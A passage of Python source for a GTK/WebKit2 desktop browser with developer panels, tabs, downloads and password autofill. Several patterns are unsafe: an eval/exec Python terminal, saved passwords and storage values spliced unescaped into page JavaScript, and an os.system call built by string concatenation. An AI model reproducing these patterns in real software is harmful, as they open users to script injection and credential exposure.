        hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
        lbl_name = Gtk.Label(label=filename)
        lbl_name.set_halign(Gtk.Align.START); lbl_name.set_ellipsize(Pango.EllipsizeMode.END)
        lbl_status = Gtk.Label(label="Downloading...")
        lbl_status.set_halign(Gtk.Align.END); lbl_status.get_style_context().add_class("bold-label")
        hbox.pack_start(lbl_name, True, True, 0); hbox.pack_end(lbl_status, False, False, 0)
        
        pbar = Gtk.ProgressBar()
        pbar.set_fraction(0.0)
        
        btn_cancel = Gtk.Button(label="Cancel")
        btn_cancel.connect("clicked", lambda b: download.cancel())
        
        vbox.pack_start(hbox, False, False, 0)
        vbox.pack_start(pbar, False, False, 0)
        vbox.pack_start(btn_cancel, False, False, 0)
        row.add(vbox); row.show_all()
        
        self.downloads_list.insert(row, 0)
        self.btn_downloads.set_active(True)
        self.downloads_popover.popup()
        
        def update_progress(dl, l):
            frac = dl.get_estimated_progress()
            pbar.set_fraction(frac)
            req = dl.get_request()
            res = dl.get_response()
            if res:
                content_length = res.get_content_length()
                if content_length > 0:
                    received = int(content_length * frac)
                    lbl_status.set_text(f"{format_bytes(received)} / {format_bytes(content_length)} ({int(frac * 100)}%)")
                else:
                    lbl_status.set_text(f"{int(frac * 100)}%")
            
        def finish_dl(dl):
            lbl_status.set_text("Finished")
            pbar.set_fraction(1.0)
            btn_cancel.set_label("Open Folder")
            btn_cancel.connect("clicked", lambda b: os.system("xdg-open " + os.path.expanduser("~/Downloads")))
            
        def fail_dl(dl, e):
            lbl_status.set_text("Failed/Cancelled")
            btn_cancel.set_sensitive(False)

        download.connect("received-data", update_progress)
        download.connect("finished", finish_dl)
        download.connect("failed", fail_dl)

    def build_terminal_emulator(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.term_output = Gtk.TextView(); self.term_output.set_editable(False); scroll = Gtk.ScrolledWindow(); scroll.add(self.term_output); box.pack_start(scroll, True, True, 0); entry = Gtk.Entry(); entry.connect("activate", self.on_term_execute); box.pack_start(entry, False, False, 0); return box
    def build_css_panel(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.css_text = Gtk.TextView(); scroll = Gtk.ScrolledWindow(); scroll.add(self.css_text); box.pack_start(scroll, True, True, 0); btn = Gtk.Button(label="Inject CSS to Tab"); btn.connect("clicked", self.on_inject_css); box.pack_start(btn, False, False, 0); return box
    def build_source_viewer(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.source_text = Gtk.TextView(); self.source_text.set_editable(False); scroll = Gtk.ScrolledWindow(); scroll.add(self.source_text); box.pack_start(scroll, True, True, 0); btn = Gtk.Button(label="Refresh DOM"); btn.connect("clicked", self.on_fetch_source); box.pack_start(btn, False, False, 0); return box
    def build_cookie_explorer(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.cookie_list = Gtk.ListBox(); scroll = Gtk.ScrolledWindow(); scroll.add(self.cookie_list); box.pack_start(scroll, True, True, 0); return box
    def build_storage_explorer(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); controls = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5); self.ls_key = Gtk.Entry(); self.ls_val = Gtk.Entry(); btn = Gtk.Button(label="+ Add"); btn.connect("clicked", self.on_add_storage); [controls.pack_start(w, True if w != btn else False, True if w != btn else False, 0) for w in (self.ls_key, self.ls_val, btn)]; box.pack_start(controls, False, False, 0); self.storage_list = Gtk.ListBox(); scroll = Gtk.ScrolledWindow(); scroll.add(self.storage_list); box.pack_start(scroll, True, True, 0); return box
    def build_network_panel(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.network_list = Gtk.ListBox(); scroll = Gtk.ScrolledWindow(); scroll.add(self.network_list); box.pack_start(scroll, True, True, 0); btn = Gtk.Button(label="Clear"); btn.connect("clicked", self.on_clear_network); box.pack_end(btn, False, False, 0); return box
    def build_js_console(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.js_output = Gtk.TextView(); self.js_output.set_editable(False); self.js_output.get_buffer().set_text("> "); scroll = Gtk.ScrolledWindow(); scroll.add(self.js_output); box.pack_start(scroll, True, True, 0); entry = Gtk.Entry(); entry.connect("activate", self.on_js_execute); box.pack_start(entry, False, False, 0); return box

    def on_js_execute(self, entry):
        if not hasattr(self, 'current_webview'): return
        js_cmd = entry.get_text(); buf = self.js_output.get_buffer(); buf.insert(buf.get_end_iter(), js_cmd + "\n"); entry.set_text("")
        def on_js_finish(w, r, u):
            try:
                val = w.run_javascript_finish(r).get_js_value()
                out = val.to_string() if val.is_string() else str(val.to_double()) if val.is_number() else str(val.to_boolean()) if val.is_boolean() else "null" if val.is_null() else "undefined" if val.is_undefined() else "[Object]"
                buf.insert(buf.get_end_iter(), "<- " + out + "\n> ")
            except Exception as e: buf.insert(buf.get_end_iter(), f"Error: {e}\n> ")
        self.current_webview.run_javascript(js_cmd, None, on_js_finish, None)

    def on_clear_network(self, btn):
        for child in self.network_list.get_children(): self.network_list.remove(child)

    def on_resource_load(self, webview, resource, request):
        uri = request.get_uri(); method = request.get_http_method() or "GET" if hasattr(request, 'get_http_method') else "GET"
        row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        lm = Gtk.Label(label=f"[{method}]"); lm.get_style_context().add_class("bold-label"); lu = Gtk.Label(label=uri); lu.set_halign(Gtk.Align.START)
        hbox.pack_start(lm, False, False, 0); hbox.pack_start(lu, True, True, 0); row.add(hbox); self.network_list.add(row); self.network_list.show_all()
        if self.adblock_enabled and any(ad in uri for ad in ["doubleclick.net", "google-analytics.com", "googlesyndication.com", "amazon-adsystem.com", "adsrvr.org"]): pass

    def refresh_cookies(self, btn=None):
        if not hasattr(self, 'current_webview'): return
        for child in self.cookie_list.get_children(): self.cookie_list.remove(child)
        def on_js_finish(w, r, u):
            try:
                for c in w.run_javascript_finish(r).get_js_value().to_string().split(";"):
                    if "=" not in c: continue
                    k, v = c.split("=", 1); row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
                    lk = Gtk.Label(label=k.strip()); lk.get_style_context().add_class("bold-label"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START); lv = Gtk.Label(label=v.strip()); lv.set_halign(Gtk.Align.START)
                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox); self.cookie_list.add(row)
                self.cookie_list.show_all()
            except: pass
        self.current_webview.run_javascript("document.cookie", None, on_js_finish, None)

    def refresh_storage(self, btn=None):
        if not hasattr(self, 'current_webview'): return
        for child in self.storage_list.get_children(): self.storage_list.remove(child)
        def on_js_finish(w, r, u):
            try:
                for k, v in json.loads(w.run_javascript_finish(r).get_js_value().to_string()).items():
                    row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
                    lk = Gtk.Label(label=k); lk.get_style_context().add_class("bold-label"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START); lv = Gtk.Label(label=str(v)); lv.set_halign(Gtk.Align.START)
                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox); self.storage_list.add(row)
                self.storage_list.show_all()
            except: pass
        self.current_webview.run_javascript("JSON.stringify(localStorage);", None, on_js_finish, None)

    def on_add_storage(self, btn):
        k, v = self.ls_key.get_text().strip(), self.ls_val.get_text().strip()
        if k and v: self.current_webview.run_javascript(f"localStorage.setItem('{k}', '{v}');", None, None, None); self.ls_key.set_text(""); self.ls_val.set_text(""); self.refresh_storage()

    def on_fetch_source(self, btn):
        if not hasattr(self, 'current_webview'): return
        def on_js_finish(w, r, u):
            try: self.source_text.get_buffer().set_text(w.run_javascript_finish(r).get_js_value().to_string())
            except: pass
        self.current_webview.run_javascript("document.documentElement.outerHTML", None, on_js_finish, None)

    def on_inject_css(self, btn):
        buf = self.css_text.get_buffer(); css = buf.get_text(buf.get_start_iter(), buf.get_end_iter(), True).replace("`", "\\`")
        self.current_webview.run_javascript(f"var s = document.createElement('style'); s.innerHTML = `{css}`; document.head.appendChild(s);", None, None, None)

    def on_term_execute(self, entry):
        cmd = entry.get_text(); buf = self.term_output.get_buffer(); buf.insert(buf.get_end_iter(), cmd + "\n")
        try: buf.insert(buf.get_end_iter(), str(eval(cmd)) + "\n>>> ")
        except:
            try: exec(cmd); buf.insert(buf.get_end_iter(), "Executed.\n>>> ")
            except Exception as ex: buf.insert(buf.get_end_iter(), f"Error: {ex}\n>>> ")
        entry.set_text("")

    def on_decide_policy(self, webview, decision, decision_type):
        if decision_type == WebKit2.PolicyDecisionType.NAVIGATION_ACTION:
            request = decision.get_request()
            uri = request.get_uri()
            if uri and uri.startswith("file://") and uri.endswith(".md"):
                path = urllib.parse.unquote(uri[7:])
                if os.path.exists(path):
                    try:
                        with open(path, "r") as f:
                            text = f.read()
                        html = f"<html><head><style>{SCROLLBAR_CSS} body {{ background: #0f1115; color: #fff; padding: 40px; font-family: monospace; white-space: pre-wrap; font-size: 14px; line-height: 1.5; }}</style></head><body>{text.replace('<', '&lt;').replace('>', '&gt;')}</body></html>"
                        webview.load_html(html, uri)
                        decision.ignore()
                        return True
                    except Exception as e:
                        print("Error loading markdown:", e)
        return False

    def new_tab(self, url):
        webview = WebKit2.WebView.new_with_user_content_manager(self.user_content)
        webview.connect("resource-load-started", self.on_resource_load)
        webview.connect("decide-policy", self.on_decide_policy)
        settings = webview.get_settings(); settings.set_enable_developer_extras(True)
        if hasattr(settings, 'set_enable_media_stream'):
            settings.set_enable_media_stream(not self.webrtc_protected)
            
        ua_val = self.ua_combo.get_active_id() if hasattr(self, 'ua_combo') else 'default'
        if ua_val == 'mobile': settings.set_user_agent("Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1")
        elif ua_val == 'bot': settings.set_user_agent("Googlebot/2.1 (+http://www.google.com/bot.html)")
        webview.set_settings(settings)
        self.apply_site_permissions(webview, url)
        
        if url == "zero://start": webview.load_html(START_PAGE_HTML, "zero://start")
        elif url == "zero://settings": webview.load_html(SETTINGS_PAGE_HTML, "zero://settings")
        elif url == "zero://shortcuts": webview.load_html(SHORTCUTS_PAGE_HTML, "zero://shortcuts")
        elif url == "zero://sessions": webview.load_html(self.generate_sessions_html(), "zero://sessions")
        elif url == "zero://markdown": webview.load_html(MARKDOWN_PAGE_HTML, "zero://markdown")
        elif url.startswith("zero://search?q="):
            q = urllib.parse.unquote(url.split("=")[1])
            engine = self.search_engine_combo.get_active_id()
            webview.load_uri(self.search_engines.get(engine, "https://google.com/search?q=") + urllib.parse.quote(q))
        else: webview.load_uri(url)
            
        scrolled = Gtk.ScrolledWindow(); scrolled.add(webview)
        wid = "tab_" + str(id(webview))
        self.tab_stack.add_named(scrolled, wid)
        
        row = Gtk.ListBoxRow(); row.set_name(wid)
        eb = Gtk.EventBox()
        hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        hbox.set_margin_top(5); hbox.set_margin_bottom(5); hbox.set_margin_start(10); hbox.set_margin_end(5)
        icon = Gtk.Image.new_from_icon_name("text-html-symbolic", Gtk.IconSize.MENU)
        label = Gtk.Label(label="New Tab")
        label.set_halign(Gtk.Align.START); label.set_ellipsize(Pango.EllipsizeMode.END); label.set_max_width_chars(15)
        
        btn_mute = Gtk.ToggleButton(); btn_mute.add(Gtk.Image.new_from_icon_name("audio-volume-high-symbolic", Gtk.IconSize.MENU))
        btn_mute.set_relief(Gtk.ReliefStyle.NONE); btn_mute.set_tooltip_text("Mute Tab")
        btn_mute.connect("toggled", lambda b: self.toggle_mute(wid, b))
        
        btn_close = Gtk.Button(); btn_close.add(Gtk.Image.new_from_icon_name("window-close-symbolic", Gtk.IconSize.MENU))
        btn_close.set_relief(Gtk.ReliefStyle.NONE); btn_close.connect("clicked", lambda b: self.close_tab(wid, b))
        
        hbox.pack_start(icon, False, False, 0); hbox.pack_start(label, True, True, 0); hbox.pack_end(btn_close, False, False, 0); hbox.pack_end(btn_mute, False, False, 0)
        eb.add(hbox)
        row.add(eb)
        row.show_all()
        
        def on_tab_button_press(widget, event):
            if event.button == 2: # Middle click
                self.close_tab(wid)
            elif event.button == 3: # Right click
                menu = Gtk.Menu()
                
                item_dup = Gtk.MenuItem(label="Duplicate Tab")
                item_dup.connect("activate", lambda w: self.new_tab(webview.get_uri()) if webview else None)
                menu.append(item_dup)
                
                item_mute = Gtk.MenuItem(label="Unmute" if webview.get_is_muted() else "Mute")
                item_mute.connect("activate", lambda w: self.toggle_mute(wid, None))
                menu.append(item_mute)
                
                item_close_others = Gtk.MenuItem(label="Close Other Tabs")
                def close_others(w):
                    to_close = [k for k in self.tabs_map.keys() if k != wid]
                    for k in to_close: self.close_tab(k)
                item_close_others.connect("activate", close_others)
                menu.append(item_close_others)
                
                item_popout = Gtk.MenuItem(label="Pop-out Window (PiP)")
                item_popout.connect("activate", lambda w: self.popout_tab(wid))
                menu.append(item_popout)
                
                menu.show_all()
                menu.popup_at_pointer(event)
                
        eb.connect("button-press-event", on_tab_button_press)
        
        self.tab_listbox.add(row); self.tabs_map[wid] = (webview, row, self.current_workspace); self.tab_stack.show_all()
        self.tab_listbox.select_row(row); self.on_tab_clicked(self.tab_listbox, row)
        
        def on_uri(w, p):
            uri = w.get_uri() or ""
            if self.current_webview == w: self.url_bar.set_text(uri)
            if not uri.startswith("zero://") and not uri.startswith("about:"): 
                title = w.get_title() or "Untitled"
                if not self.is_private:
                    self.add_to_popover(self.history_list, title, uri, "text-html-symbolic")
                self.apply_site_permissions(w, uri)
            
        def on_title(w, p):
            title = w.get_title() or "Untitled"
            label.set_text(title)
            if self.current_webview == w: self.header.set_title(title)
            
        def on_load(w, ev):
            if ev == WebKit2.LoadEvent.FINISHED:
                u = w.get_uri()
                if u and not self.is_private:
                    domain = urllib.parse.urlparse(u).hostname
                    if domain in self.passwords:
                        cred = self.passwords[domain]
                        js = f"setTimeout(() => {{ let p = document.querySelector('input[type=\"password\"]'); if(p) {{ p.value = '{cred['pass']}'; let u = document.querySelector('input[type=\"text\"], input[type=\"email\"]'); if(u) u.value = '{cred['user']}'; }} }}, 500);"
                        w.run_javascript(js, None, None, None)
                        
        webview.connect("notify::uri", on_uri); webview.connect("notify::title", on_title); webview.connect("load-changed", on_load)

    def on_url_activate(self, entry):
        url = entry.get_text()
        if url == "zero://start":
            if hasattr(self, 'current_webview'): self.current_webview.load_html(START_PAGE_HTML, "zero://start")
            return
        elif url == "zero://settings":
            if hasattr(self, 'current_webview'): self.current_webview.load_html(SETTINGS_PAGE_HTML, "zero://settings")
            return
        elif url == "zero://shortcuts":
            if hasattr(self, 'current_webview'): self.current_webview.load_html(SHORTCUTS_PAGE_HTML, "zero://shortcuts")
            return
        elif url == "zero://sessions":
            if hasattr(self, 'current_webview'): self.current_webview.load_html(self.generate_sessions_html(), "zero://sessions")
            return
        elif url == "zero://markdown":
            if hasattr(self, 'current_webview'): self.current_webview.load_html(MARKDOWN_PAGE_HTML, "zero://markdown")
            return
            
        if url.startswith("/"):
            if os.path.exists(url): url = "file://" + os.path.abspath(url)
        elif not url.startswith("http") and not url.startswith("zero://") and not url.startswith("file://"): 
            if "." in url and " " not in url:
                url = "https://" + url
            else:
                engine = self.search_engine_combo.get_active_id()
                url = self.search_engines.get(engine, "https://google.com/search?q=") + urllib.parse.quote(url)
        if hasattr(self, 'current_webview'): self.current_webview.load_uri(url)

    def setup_css(self):
        css = b'''
            .bold-label { font-weight: bold; }
            .dim-label { color: #888888; font-size: 11px; }
            .vertical-tabs-box { background: #16181D; border-right: 1px solid rgba(255,255,255,0.05); }
            .tabs-header { color: #8090A0; font-size: 11px; font-weight: bold; letter-spacing: 1px; }
            .vertical-tabs-list { background: transparent; }
            .vertical-tabs-list row { padding: 4px; border-radius: 6px; margin: 2px 6px; transition: all 0.2s; }
            .vertical-tabs-list row:hover { background: rgba(255,255,255,0.05); }
            .vertical-tabs-list row:selected { background: rgba(77,144,254,0.15); border: 1px solid rgba(77,144,254,0.3); }
            .private-header { background: #4a148c; border-bottom: 2px solid #8e24aa; }
            .cmd-palette { border: 1px solid #4D90FE; border-radius: 8px; background: rgba(30, 30, 30, 0.95); }
            .find-bar { background: rgba(40,40,40,0.95); padding: 5px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); }
        '''
        provider = Gtk.CssProvider(); provider.load_from_data(css)
        Gtk.StyleContext.add_provider_for_screen(Gdk.Screen.get_default(), provider, Gtk.STYLE_PROVIDER_PRIORITY_APPLICATION)

if __name__ == "__main__":
    win = ZeroDevBrowser()
    win.connect("destroy", lambda w: (win.save_session(), Gtk.main_quit()))
    win.show_all()
    Gtk.main()
